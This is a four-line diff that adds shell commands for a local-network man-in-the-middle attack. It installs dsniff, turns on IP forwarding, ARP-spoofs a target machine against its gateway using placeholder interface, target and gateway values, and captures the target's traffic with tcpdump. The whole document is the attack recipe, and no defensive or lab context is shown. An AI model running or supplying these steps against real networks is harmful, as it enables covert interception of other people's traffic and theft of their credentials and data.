@@ -1,0 +1,4 @@
+apt-get install dsniff
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i {interface} -t {target_ip} {gateway}
+tcpdump -i {interface} src {target_ip}
